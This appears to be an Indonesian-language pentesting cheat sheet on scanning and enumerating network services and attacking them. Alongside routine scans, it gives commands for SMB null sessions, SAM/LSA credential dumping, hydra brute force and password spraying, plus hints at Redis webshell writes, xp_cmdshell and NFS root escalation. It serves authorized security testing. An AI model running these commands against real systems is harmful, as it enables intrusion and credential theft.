# NETWORK — Enumeration & Exploitation

> Untuk target IP/range. Pola: **scan bertahap** (cepat → detail) → enum **per-service** → cari akses.
> Semua ke `scan/`. Jangan skip service "boring" (SNMP, NFS, RPC sering emas).

## Daftar Isi
1. [Port Scanning bertahap](#scan)
2. [Per-service: 21/22/25/53](#svc1)
3. [SMB 139/445](#smb)
4. [LDAP 389/636 & Kerberos 88](#ldap)
5. [SNMP 161](#snmp)
6. [NFS/RPC 111/2049](#nfs)
7. [Databases](#db)
8. [Web 80/443 & lain](#web)
9. [TLS/SSL audit](#tls)
10. [Password attacks](#pass)

---

<a name="scan"></a>
## 1. Port Scanning Bertahap

```bash
# 1) Cepat: temukan port terbuka (rustscan / masscan)
rustscan -a $IP --ulimit 5000 -- -oA scan/rustscan
masscan -p1-65535 $IP --rate 10000 -oL scan/masscan.txt   # network besar

# 2) Detail: hanya port terbuka → versi + default script
nmap -Pn -sV -sC -p<PORTS> -oA scan/detail $IP

# 3) Lengkap all-ports (jangan cuma top-1000!)
nmap -Pn -p- --min-rate 5000 -T4 -oA scan/allports $IP

# UDP (sering terlupa: SNMP/DNS/NTP/TFTP/IKE)
nmap -Pn -sU --top-ports 100 -oA scan/udp $IP

# Vuln scripts (hati-hati, bisa noisy)
nmap -Pn --script vuln -p<PORTS> -oA scan/vuln $IP
```

---

<a name="svc1"></a>
## 2. FTP(21) / SSH(22) / SMTP(25) / DNS(53)

**FTP 21:**
```bash
nmap -p21 --script ftp-anon,ftp-syst $IP
ftp $IP        # coba anonymous:anonymous → cek file, upload dir writable?
```

**SSH 22:**
```bash
nmap -p22 --script ssh2-enum-algos,ssh-auth-methods $IP
ssh-audit $IP
# User enum (versi lama), key-based? password? brute hanya jika in-scope & rate aman
```

**SMTP 25/465/587:**
```bash
nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay $IP
# VRFY/EXPN/RCPT → user enum. Open relay → spam/phish. STARTTLS smuggling.
```

**DNS 53:**
```bash
dig axfr @$IP $TARGET        # zone transfer → semua record (jackpot kalau kebuka)
nmap -p53 --script dns-zone-transfer,dns-recursion $IP
```

---

<a name="smb"></a>
## 3. SMB 139/445 (sangat sering emas)

```bash
# Info OS/domain/signing
nmap -p445 --script smb-os-discovery,smb-security-mode,smb2-security-mode $IP
enum4linux-ng -A $IP | tee scan/enum4linux.txt

# Null / guest session → shares, users, policy
crackmapexec smb $IP -u '' -p '' --shares
crackmapexec smb $IP -u 'guest' -p '' --shares --users --pass-pol
smbclient -L //$IP/ -N                 # list shares
smbclient //$IP/<share> -N             # akses share
smbmap -H $IP -u '' -p ''              # permission per share (READ/WRITE)

# Vuln klasik (patch check)
nmap -p445 --script smb-vuln-ms17-010 $IP   # EternalBlue
# Signing disabled → SMB relay (lihat active-directory.md)

# Kalau punya creds:
crackmapexec smb $IP -u user -p pass --shares --sam --lsa
```

---

<a name="ldap"></a>
## 4. LDAP 389/636 & Kerberos 88 (Domain Controller)

```bash
# Anonymous bind → dump naming context, users
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
nmap -p389 --script ldap-search,ldap-rootdse $IP

# Kerberos user enum (tanpa creds!)
kerbrute userenum -d corp.local --dc $IP users.txt
```
Detail serangan domain → `references/active-directory.md`.

---

<a name="snmp"></a>
## 5. SNMP 161 (sering terlupakan — jackpot)

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP   # brute community string
snmpwalk -v2c -c public $IP | tee scan/snmp.txt                  # dump semua
snmpbulkwalk -v2c -c public $IP .1
# Community string umum: public, private, community, manager
# OID emas: proses, user, software terinstall, route, ARP, share, bahkan config Cisco
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25   # user list (Windows)
snmp-check $IP -c public
```

---

<a name="nfs"></a>
## 6. NFS / RPC 111 / 2049

```bash
rpcinfo -p $IP
showmount -e $IP                       # export list
mkdir /tmp/nfs && mount -t nfs $IP:/export /tmp/nfs -o nolock
# no_root_squash? → drop SUID binary sbg root → privesc. Baca file sensitif.
```

---

<a name="db"></a>
## 7. Databases

```bash
# MySQL 3306
mysql -h $IP -u root -p''            # weak/no cred
nmap -p3306 --script mysql-empty-password,mysql-info,mysql-databases $IP

# MSSQL 1433
mssqlclient.py user:pass@$IP         # impacket; xp_cmdshell → RCE
nmap -p1433 --script ms-sql-info,ms-sql-empty-password $IP

# PostgreSQL 5432 → COPY FROM PROGRAM → RCE
# Redis 6379 (unauth klasik!)
redis-cli -h $IP
redis-cli -h $IP CONFIG GET '*'      # write webshell / SSH key via CONFIG SET dir + dbfilename
# MongoDB 27017 unauth → mongosh $IP → show dbs
# Elasticsearch 9200 → curl $IP:9200/_cat/indices  (data terbuka)
```

---

<a name="web"></a>
## 8. Web & Lainnya

```bash
# 80/443/8080/8443 → lihat web-api.md + recon.md
whatweb https://$IP; nuclei -u https://$IP -severity medium,high,critical

# RDP 3389: nmap --script rdp-ntlm-info; BlueKeep check (CVE-2019-0708)
# WinRM 5985/5986: crackmapexec winrm $IP -u u -p p ; evil-winrm -i $IP -u u -p p
# VNC 5900: no-auth? vncviewer. Redis/Memcached/Kafka/RabbitMQ unauth mgmt panel.
# Printer/IoT: default cred (admin:admin) → LDAP creds bocor, SMB relay.
```

---

<a name="tls"></a>
## 9. TLS / SSL Audit

```bash
testssl.sh https://$TARGET | tee scan/testssl.txt
sslscan $TARGET
nmap -p443 --script ssl-enum-ciphers,ssl-cert $IP
# Cari: TLS 1.0/1.1, RC4/3DES/EXPORT cipher, Heartbleed, POODLE, cert expired/self-signed,
#       wildcard cert (info aset), weak DH, no HSTS.
```

---

<a name="pass"></a>
## 10. Password Attacks (hanya jika in-scope, rate aman)

```bash
# Service brute (hydra)
hydra -L users.txt -P pass.txt ssh://$IP -t 4 -o scan/hydra-ssh.txt
hydra -l admin -P pass.txt $IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid" -o scan/hydra-web.txt

# Password spraying (1 pass ke banyak user — lebih aman dari lockout)
crackmapexec smb $IP -u users.txt -p 'Winter2025!' --continue-on-success

# Hash crack (offline — utama)
hashcat -m <mode> hashes.txt rockyou.txt -r rules/best64.rule
john --wordlist=rockyou.txt hashes.txt
# mode: 1000=NTLM 1800=sha512crypt 3200=bcrypt 13100=Kerberoast 18200=ASREP 16500=JWT
```

> **Prioritas:** offline hash crack > password spray > targeted brute. Hindari brute massal (lockout, noise).
